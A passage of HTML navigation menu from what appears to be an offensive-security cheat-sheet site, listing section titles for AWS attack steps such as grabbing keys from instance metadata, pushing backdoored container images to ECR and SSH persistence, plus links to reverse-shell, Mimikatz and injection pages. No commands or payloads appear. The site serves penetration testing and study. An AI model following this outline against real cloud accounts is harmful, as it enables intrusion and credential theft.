  <a href="#retrieving-information-about-a-specific-version-of-policy" class="md-nav__link">
    Retrieving information about a specific version of policy
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-all-secrets-stored-by-secret-manager_1" class="md-nav__link">
    Listing all secrets stored by Secret Manager
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-information-about-a-specific-secret_1" class="md-nav__link">
    Listing information about a specific secret
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#getting-resource-based-policy-attached-to-an-specific-secret" class="md-nav__link">
    Getting resource-based policy attached to an specific secret
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#getting-the-secret-value" class="md-nav__link">
    Getting the secret value
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#kms" class="md-nav__link">
    KMS
  </a>
  
    <nav class="md-nav" aria-label="KMS">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#listing-an-specific-key" class="md-nav__link">
    Listing an specific key
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-policies-attached-to-an-specified-key" class="md-nav__link">
    Listing policies attached to an specified key
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-full-information-about-a-policy" class="md-nav__link">
    Listing full information about a policy
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#decrypt-the-secret-using-the-key" class="md-nav__link">
    Decrypt the secret using the key
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#containers" class="md-nav__link">
    Containers
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#initial-access_1" class="md-nav__link">
    Initial Access
  </a>
  
    <nav class="md-nav" aria-label="Initial Access">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#getting-the-secret-information-from-eks" class="md-nav__link">
    Getting the secret information from EKS
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#enumeration_3" class="md-nav__link">
    Enumeration
  </a>
  
    <nav class="md-nav" aria-label="Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ecr" class="md-nav__link">
    ECR
  </a>
  
    <nav class="md-nav" aria-label="ECR">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#listing-all-repositories-in-container-registry" class="md-nav__link">
    Listing all repositories in container registry
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-information-about-repository-policy" class="md-nav__link">
    Listing information about repository policy
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-all-images-in-a-specific-repository" class="md-nav__link">
    Listing all images in a specific repository
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-information-about-an-image" class="md-nav__link">
    Listing information about an image
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ecs" class="md-nav__link">
    ECS
  </a>
  
    <nav class="md-nav" aria-label="ECS">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#listing-all-ecs-clusters" class="md-nav__link">
    Listing all ECS clusters
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-information-about-an-specific-cluster" class="md-nav__link">
    Listing information about an specific cluster
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-all-services-in-specified-cluster" class="md-nav__link">
    Listing all services in specified cluster
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-information-about-an-specific-service" class="md-nav__link">
    Listing information about an specific service
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-tasks-in-specific-cluster" class="md-nav__link">
    Listing tasks in specific cluster
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-information-about-an-specific-task" class="md-nav__link">
    Listing information about an specific task
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-all-containers-in-specified-cluster" class="md-nav__link">
    Listing all containers in specified cluster
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#eks" class="md-nav__link">
    EKS
  </a>
  
    <nav class="md-nav" aria-label="EKS">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#listing-all-eks-clusters" class="md-nav__link">
    Listing all EKS clusters
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-information-about-an-specific-cluster_1" class="md-nav__link">
    Listing information about an specific cluster
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-all-node-groups-in-specified-cluster" class="md-nav__link">
    Listing all node groups in specified cluster
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-specific-information-about-a-node-group-in-a-cluster" class="md-nav__link">
    Listing specific information about a node group in a cluster
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-fargate-in-specified-cluster" class="md-nav__link">
    Listing Fargate in specified cluster
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-information-about-a-fargate-profile-in-a-cluster" class="md-nav__link">
    Listing information about a fargate profile in a cluster
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#persistence_1" class="md-nav__link">
    Persistence
  </a>
  
    <nav class="md-nav" aria-label="Persistence">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#enumerating-the-user" class="md-nav__link">
    Enumerating the user
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-manager-policies-attached-to-the-iam-role" class="md-nav__link">
    Listing manager policies attached to the IAM role
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#getting-information-about-the-version-of-the-managed-policy" class="md-nav__link">
    Getting information about the version of the managed policy
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#getting-information-about-the-repositories-in-container-registry" class="md-nav__link">
    Getting information about the repositories in container registry
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-all-images-in-the-repository" class="md-nav__link">
    Listing all images in the repository
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-information-about-an-image_1" class="md-nav__link">
    Listing information about an image
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#authenticate-the-docker-daemon-to-ecr" class="md-nav__link">
    Authenticate the docker daemon to ECR
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#building-images-with-backdoor" class="md-nav__link">
    Building images with backdoor
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tagging-the-docker-image" class="md-nav__link">
    Tagging the docker image
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#pushing-the-image-to-ecr" class="md-nav__link">
    Pushing the image to ECR
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ec2" class="md-nav__link">
    EC2
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#enumeration_4" class="md-nav__link">
    Enumeration
  </a>
  
    <nav class="md-nav" aria-label="Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#listing-information-about-all-instances" class="md-nav__link">
    Listing information about all instances
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-information-about-a-specific-region" class="md-nav__link">
    Listing information about a specific region
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-information-about-specific-instance" class="md-nav__link">
    Listing information about specific instance
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#extracting-userdata-attribute-of-specified-instance" class="md-nav__link">
    Extracting UserData attribute of specified instance
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-roles-of-an-instance" class="md-nav__link">
    Listing roles of an instance
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#exploitation_1" class="md-nav__link">
    Exploitation
  </a>
  
    <nav class="md-nav" aria-label="Exploitation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#remote-code-execution" class="md-nav__link">
    Remote code execution
  </a>
  
    <nav class="md-nav" aria-label="Remote code execution">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#aws-metadata" class="md-nav__link">
    AWS Metadata
  </a>
  
    <nav class="md-nav" aria-label="AWS Metadata">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#grabbing-the-keys-to-access-the-instance" class="md-nav__link">
    Grabbing the keys to access the instance
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#grabbing-the-keys-in-metadata-version-2" class="md-nav__link">
    Grabbing the keys in metadata version 2
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#aws-userdata" class="md-nav__link">
    AWS Userdata
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#privilege-escalation_2" class="md-nav__link">
    Privilege Escalation
  </a>
  
    <nav class="md-nav" aria-label="Privilege Escalation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#getting-information-about-the-key" class="md-nav__link">
    Getting information about the key
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#getting-policies-attached-to-the-iam-user" class="md-nav__link">
    Getting policies attached to the IAM user
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#getting-information-about-a-specific-policy-version" class="md-nav__link">
    Getting information about a specific policy version
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listing-instance-profiles" class="md-nav__link">
    Listing instance profiles
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#attach-an-instance-profile-to-an-ec2-instance" class="md-nav__link">
    Attach an instance profile to an EC2 instance
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#credential-access_1" class="md-nav__link">
    Credential Access
  </a>
  
    <nav class="md-nav" aria-label="Credential Access">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#after-the-initial-access" class="md-nav__link">
    After the initial access
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#persistence_2" class="md-nav__link">
    Persistence
  </a>
  
    <nav class="md-nav" aria-label="Persistence">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ssh-persistence-example" class="md-nav__link">
    SSH Persistence example
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Cloud%20-%20Azure%20Pentest/" class="md-nav__link">
        Cloud - Azure
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Cobalt%20Strike%20-%20Cheatsheet/" class="md-nav__link">
        Cobalt Strike
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Container%20-%20Docker%20Pentest/" class="md-nav__link">
        Container - Docker Pentest
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Container%20-%20Kubernetes%20Pentest/" class="md-nav__link">
        Container - Kubernetes Pentest
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Escape%20Breakout/" class="md-nav__link">
        Application Escape and Breakout
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Hash%20Cracking/" class="md-nav__link">
        Hash Cracking
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Linux%20-%20Evasion/" class="md-nav__link">
        Linux - Evasion
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Linux%20-%20Persistence/" class="md-nav__link">
        Linux - Persistence
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Linux%20-%20Privilege%20Escalation/" class="md-nav__link">
        Linux - Privilege Escalation
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../MSSQL%20Server%20-%20Cheatsheet/" class="md-nav__link">
        MSSQL Server
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Metasploit%20-%20Cheatsheet/" class="md-nav__link">
        Metasploit
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Methodology%20and%20enumeration/" class="md-nav__link">
        Bug Hunting Methodology and Enumeration
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Miscellaneous%20-%20Tricks/" class="md-nav__link">
        Miscellaneous & Tricks
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Network%20Discovery/" class="md-nav__link">
        Network Discovery
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Network%20Pivoting%20Techniques/" class="md-nav__link">
        Network Pivoting Techniques
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Office%20-%20Attacks/" class="md-nav__link">
        Office - Attacks
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Powershell%20-%20Cheatsheet/" class="md-nav__link">
        Powershell
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Reverse%20Shell%20Cheatsheet/" class="md-nav__link">
        Reverse Shell Cheat Sheet
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Source%20Code%20Management/" class="md-nav__link">
        Source Code Management
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Subdomains%20Enumeration/" class="md-nav__link">
        Subdomains Enumeration
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Windows%20-%20AMSI%20Bypass/" class="md-nav__link">
        AMSI Bypass
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Windows%20-%20DPAPI/" class="md-nav__link">
        Windows - DPAPI
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Windows%20-%20Defenses/" class="md-nav__link">
        Windows - Defenses
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Windows%20-%20Download%20and%20Execute/" class="md-nav__link">
        Windows - Download and execute methods
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Windows%20-%20Mimikatz/" class="md-nav__link">
        Windows - Mimikatz
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Windows%20-%20Persistence/" class="md-nav__link">
        Windows - Persistence
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Windows%20-%20Privilege%20Escalation/" class="md-nav__link">
        Windows - Privilege Escalation
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Windows%20-%20Using%20credentials/" class="md-nav__link">
        Windows - Using credentials
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_30" >
      
      
      
        <label class="md-nav__link" for="__nav_30" id="__nav_30_label" tabindex="0">
          NoSQL Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_30_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_30">
          <span class="md-nav__icon md-icon"></span>
          NoSQL Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../NoSQL%20Injection/" class="md-nav__link">
        NoSQL Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_31" >
      
      
      
        <label class="md-nav__link" for="__nav_31" id="__nav_31_label" tabindex="0">
          OAuth Misconfiguration
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_31_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_31">
          <span class="md-nav__icon md-icon"></span>
          OAuth Misconfiguration
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../OAuth%20Misconfiguration/" class="md-nav__link">
        OAuth Misconfiguration
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_32" >
      
      
      
        <label class="md-nav__link" for="__nav_32" id="__nav_32_label" tabindex="0">
          Open Redirect
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_32_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_32">
          <span class="md-nav__icon md-icon"></span>
          Open Redirect
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Open%20Redirect/" class="md-nav__link">
        Open URL Redirection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_33" >
      
      
      
        <label class="md-nav__link" for="__nav_33" id="__nav_33_label" tabindex="0">
          Race Condition
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_33_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_33">
          <span class="md-nav__icon md-icon"></span>
          Race Condition
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Race%20Condition/" class="md-nav__link">
        Race Condition
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_34" >
      
      
      
        <label class="md-nav__link" for="__nav_34" id="__nav_34_label" tabindex="0">
          Request Smuggling
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_34_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_34">
          <span class="md-nav__icon md-icon"></span>
          Request Smuggling
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Request%20Smuggling/" class="md-nav__link">
        Request Smuggling
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_35" >
      
      
      
        <label class="md-nav__link" for="__nav_35" id="__nav_35_label" tabindex="0">
          SAML Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_35_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_35">
          <span class="md-nav__icon md-icon"></span>
          SAML Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../SAML%20Injection/" class="md-nav__link">
        SAML Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_36" >
      
      
      
        <label class="md-nav__link" for="__nav_36" id="__nav_36_label" tabindex="0">
          SQL Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_36_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_36">
          <span class="md-nav__icon md-icon"></span>
          SQL Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../SQL%20Injection/" class="md-nav__link">
        SQL Injection
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../SQL%20Injection/BigQuery%20Injection/" class="md-nav__link">
        Google BigQuery SQL Injection
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../SQL%20Injection/Cassandra%20Injection/" class="md-nav__link">
        Cassandra Injection
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../SQL%20Injection/DB2%20Injection/" class="md-nav__link">
        DB2 Injection
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../SQL%20Injection/HQL%20Injection/" class="md-nav__link">
        Hibernate Query Language Injection
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../SQL%20Injection/MSSQL%20Injection/" class="md-nav__link">
        MSSQL Injection
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../SQL%20Injection/MySQL%20Injection/" class="md-nav__link">
        MYSQL Injection
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../SQL%20Injection/OracleSQL%20Injection/" class="md-nav__link">
        Oracle SQL Injection
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../SQL%20Injection/PostgreSQL%20Injection/" class="md-nav__link">
        PostgreSQL injection
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../SQL%20Injection/SQLite%20Injection/" class="md-nav__link">
        SQLite Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_37" >
      
      
      
        <label class="md-nav__link" for="__nav_37" id="__nav_37_label" tabindex="0">
          Server Side Request Forgery
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_37_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_37">
          <span class="md-nav__icon md-icon"></span>
          Server Side Request Forgery
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Server%20Side%20Request%20Forgery/" class="md-nav__link">
        Server-Side Request Forgery
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_38" >
      
      
      
        <label class="md-nav__link" for="__nav_38" id="__nav_38_label" tabindex="0">
          Server Side Template Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_38_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_38">
          <span class="md-nav__icon md-icon"></span>
          Server Side Template Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Server%20Side%20Template%20Injection/" class="md-nav__link">
        Server Side Template Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_39" >
      
      
      
        <label class="md-nav__link" for="__nav_39" id="__nav_39_label" tabindex="0">
          Tabnabbing
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_39_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_39">
          <span class="md-nav__icon md-icon"></span>
          Tabnabbing
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Tabnabbing/" class="md-nav__link">
        Tabnabbing
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_40" >
      
      
      
        <label class="md-nav__link" for="__nav_40" id="__nav_40_label" tabindex="0">
          Type Juggling
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_40_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_40">
          <span class="md-nav__icon md-icon"></span>
          Type Juggling
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Type%20Juggling/" class="md-nav__link">
        PHP Juggling type and magic hashes
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_41" >
      
      
      
        <label class="md-nav__link" for="__nav_41" id="__nav_41_label" tabindex="0">
          Upload Insecure Files
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_41_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_41">
          <span class="md-nav__icon md-icon"></span>
          Upload Insecure Files
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Upload%20Insecure%20Files/" class="md-nav__link">
        Upload Insecure Files
      </a>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_41_2" >
      
      
      
        <label class="md-nav__link" for="__nav_41_2" id="__nav_41_2_label" tabindex="0">
          CVE Ffmpeg HLS
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_41_2_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_41_2">
          <span class="md-nav__icon md-icon"></span>
          CVE Ffmpeg HLS
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS/" class="md-nav__link">
        FFmpeg HLS vulnerability
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_41_3" >
      
      
      
        <label class="md-nav__link" for="__nav_41_3" id="__nav_41_3_label" tabindex="0">
          Configuration Apache .htaccess
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_41_3_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_41_3">
          <span class="md-nav__icon md-icon"></span>
          Configuration Apache .htaccess
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess/" class="md-nav__link">
        .htaccess upload
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_41_4" >
      
      
      
        <label class="md-nav__link" for="__nav_41_4" id="__nav_41_4_label" tabindex="0">
          Configuration Busybox httpd.conf
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_41_4_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_41_4">
          <span class="md-nav__icon md-icon"></span>
          Configuration Busybox httpd.conf
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Upload%20Insecure%20Files/Configuration%20Busybox%20httpd.conf/" class="md-nav__link">
        Index
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_41_5" >
      
      
      
        <label class="md-nav__link" for="__nav_41_5" id="__nav_41_5_label" tabindex="0">
          Configuration uwsgi.ini
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_41_5_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_41_5">
          <span class="md-nav__icon md-icon"></span>
          Configuration uwsgi.ini
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Upload%20Insecure%20Files/Configuration%20uwsgi.ini/" class="md-nav__link">
        uWSGI configuration file
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_41_6" >
      
      
      
        <label class="md-nav__link" for="__nav_41_6" id="__nav_41_6_label" tabindex="0">
          Extension Flash
          <span class="md-nav__icon md-icon"></span>
        </label>
      
